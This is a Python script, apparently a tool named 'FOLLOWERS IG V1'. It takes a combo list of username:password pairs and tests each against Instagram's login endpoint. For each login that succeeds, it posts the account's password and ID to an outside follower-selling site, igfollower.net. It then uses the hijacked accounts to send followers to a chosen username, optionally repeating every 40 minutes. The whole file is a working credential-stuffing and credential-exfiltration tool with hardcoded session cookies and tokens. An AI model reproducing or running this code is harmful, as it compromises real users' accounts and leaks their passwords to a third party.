
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White
Black="\033[1;30m"       # Black

Red="\033[1;31m"         # 
Green="\033[1;32m"       # 'هGreen
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White
import requests
from time import sleep 
def test_list(username,password,u2):
        global bad,done,block,ban
        Req = requests.post('https://www.instagram.com/accounts/login/ajax/', headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '379',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YwFaswALAAGDUIqF4Zv_KkYyK5dy; ig_did=87AF4E9C-A6A1-45EB-9934-7036FDE00AE5; datr=qFsBY4YVOAiwQpifGnwwO1oO; shbid="10011\0543272046838\0541694111575:01f7366bb0a663d7a42a2cc1b628b3d07d49a42bbb67dc1dbe955cd930d60a346a3d703d"; shbts="1662575575\0543272046838\0541694111575:01f7ccb79e8bab04471e2608c7922fbe6fb7b276b2dbb3c7110f7dd5cdd44043bb79086c"; rur="NAO\0543272046838\0541694199569:01f7ab483627fde29c504bd42b02cea174a7dcb4904d5a46fe19eef089388cfb6f0a7790"; csrftoken=LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64 (Edition Campaign 34)',
            'x-asbd-id': '198387',
            'x-csrftoken': 'LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0iSQ98lXvHxKM40b30YUTjBQOI5i1AFNwhXj3bMCuFHShO',
            'x-instagram-ajax': '50d4f75b2921',
            'x-requested-with': 'XMLHttpRequest',
        },data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+password,
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': False,
        'stopDeletionNonce': "",
        'trustedDeviceRecords': '{}'
            })
        if 'errors' in Req.text:
            print(B+' Block • ')
        elif Req.text== '{"message":"","status":"fail"}':
            print(B+' Block • ')
	

        elif Req.text == '{"user":true,"authenticated":false,"status":"ok"}':
            print(B+' Erorr Login • ')
		
        elif Req.text == '{"user":false,"authenticated":false,"status":"ok"}':
            print(B+' User Not Found • ')
        
        elif 'userId' in Req.text:
            id=Req.cookies['ds_user_id']
            user=username
            pas=password
            url_l = 'https://www.instagram.com/accounts/login/ajax/'
            h = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar,en-US;q=0.9,en;q=0.8',
'content-length':'326',
'content-type':'application/x-www-form-urlencoded',
'cookie':'mid=YVvhbgALAAGEYIx5zhMwH4bDBV45; ig_did=648907BC-0061-4C67-AFF5-C72FAA705508; ig_nrcb=1; rur="LDC\05451296553316\0541675250058:01f73352f31122060f419a1c03ef57b01f1db6d027546e0dce91569f7ba529abb34ba7de"; csrftoken=nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'" Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
'x-asbd-id':'198387',
'x-csrftoken':'nM9X5ZO6mQsQ2mbsnSVMu2fy8wd5woQe',
'x-ig-app-id':'936619743392459',
'x-ig-www-claim':'hmac.AR3VqP_m-krwiZnt3-dga6AdX4Ci5cwQwDhvGD_6DT0IRX8c',
'x-instagram-ajax':'ee0117db2fab',
'x-requested-with':'XMLHttpRequest'}
            d = {'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1643714074:'+(pas),'username':user,'queryParams':'{}','optIntoOneTap':'false','stopDeletionNonce':'','trustedDeviceRecords':'{}',}
            r = requests.post(url_l,headers=h,data=d)
            if '"authenticated":true' in r.text:
                si = r.cookies['sessionid']
                iid = r.cookies['ds_user_id']
                csrftoken=r.cookies['csrftoken']
                print(D+' Done Login • ')
            else:
                print(B+' Erorr Login • ')
        		
            url=f'https://i.instagram.com/api/v1/users/web_profile_info/?username={u2}'
            headers={
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'accept-encoding': 'gzip, deflate, br',
	'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	'cache-control': 'max-age=0',
	'cookie': f'ig_did=37396E22-2BAA-45B4-BE12-2C138F2EE907; ig_nrcb=1; mid=Yoo2NAALAAF_bSUg9E76T9FjnyOg; datr=1w6bYk9s5Fe7mNlwoBvLzX_d; shbid="6501\{id}\0541689888481:01f73c5c447b81316667f3fef03e854ec17819127a3a7cfc708b6d6e3b1375631101f397"; shbts="1658352481\{id}\0541689888481:01f71e2280fe2389aebca035d43296bda632ccf8386b2b0d3dbc3285dce2018e676c77fc"; ds_user_id={id}; csrftoken={csrftoken}; sessionid={si}; rur="NAO/{id}\0541690144166:01f716870c4d087f0dc86549dd21ad03c1b4a998a97bce93ceda73f7ddfef603bcf6b03a"',
	'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
	'sec-ch-ua-mobile': '?0',
	'sec-ch-ua-platform': '"Windows"',
	'sec-fetch-dest': 'document',
	'sec-fetch-mode': 'navigate',
	'sec-fetch-site': 'none',
	'sec-fetch-user': '?1',
	'upgrade-insecure-requests': '1',
	'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1 Instagram 231.0.0.18.113',
	'x-frame-options': 'SAMEORIGIN'
	}
            req=requests.get(url,headers=headers)
            id=str(req.json()['data']['user']['id'])
            url='https://igfollower.net/girisyap'
            data={
	'username': user,
	'password': pas,
	'userid': id,
	
	}
            try:
                r=requests.session()
                req=r.post(url,data=data)
	        	
                if req.json()['status']=='success':
                    pass
                else :
                    print(B+' Somtheg Error • ')
	        		
            except :
                pass
            b,g=0,0
        	
        	
            for i in range(29):
                if b > 10:
                    print(D+' you used this account ')
                    break
                url=f'https://igfollower.net/tools/send-follower/{iid}?formType=send'
                data={
'userName': u2,
'adet': i,
'userID': iid
}
                try:
                        re=r.post(url,data=data).json()['status']
                        if re == 'success':
                          g=g+1
                          print(f'\r{D} Done | {g}',end="")
                        else :
                            b=b+1
	        					
                except :
                        pass

        
        	
        if 'password' in Req.text:
        	print(B+' Password is Bad • ')
        	





print(f'''

     {Red} ███████╗ {White} |{Red}   ██████╗ 
    {Red}  ██╔════╝ {White} | {Red} ██╔════╝ 
  {Red}    █████╗  {White}  |{Red}  ██║  ███╗
   {Red}   ██╔══╝ {White}   |{Red}  ██║   ██║
    {Red}  ██║     {White}  | {Red} ╚██████╔╝
  {Red}    ╚═╝     {White}  |  {Red} ╚═════╝ 
                       
                            
		
      {Yellow}   • {White}FOLLOWERS IG V1
          
    
{Yellow}•{White} IG   | FX_PY3
{Yellow}•{White} T.ME | FX_PY

''')

_=f'{White}[{Yellow}+{White}] - {White}'
D=f'{White}[{Green}✓{White}] - {White}'
B=f'{White}[{Red}x{White}] - {White}'
file=input(_+' Enter File Combo : ')
ur_name=input(_+' Enter username : ')
TIME=input(_+' Activate re-increase followers after 40 minutes  ?  Y/N : ')
print('')
if TIME == 'N':
	for combo in open(file,'r').read().splitlines(): 

		print('\n--------------------------')
		username=combo.split(':')[0]
		password=combo.split(':')[1]
		print(username+':',end="")
		print(password)
		test_list(username,password,ur_name)
		print('--------------------------\n')
	print(D+' FINSH ')

elif TIME == 'Y':
	while True:
		for combo in open(file,'r').read().splitlines(): 

			print('\n--------------------------')
			username=combo.split(':')[0]
			password=combo.split(':')[1]
			print(username+':',end="")
			print(password)
			test_list(username,password,ur_name)
			print('--------------------------\n')
		for i in range(2400):
			print(f'\r{White}Stay [{2400-i}] To increase followers again • ',end="")
			sleep(1)

if TIME == 'n':
	for combo in open(file,'r').read().splitlines(): 

		print('\n--------------------------')
		username=combo.split(':')[0]
		password=combo.split(':')[1]
		print(username+':',end="")
		print(password)
		test_list(username,password,ur_name)
		print('--------------------------\n')
	print(D+' FINSH ')


elif TIME == 'y':
	while True:
		for combo in open(file,'r').read().splitlines(): 

			print('\n--------------------------')
			username=combo.split(':')[0]
			password=combo.split(':')[1]
			print(username+':',end="")
			print(password)
			test_list(username,password,ur_name)
			print('--------------------------\n')
		for i in range(2400):
			print(f'\rStay [{2400-i}] To increase followers again • ',end="")
			sleep(1)
else:
	print(B+' y or n only! Try again• ')
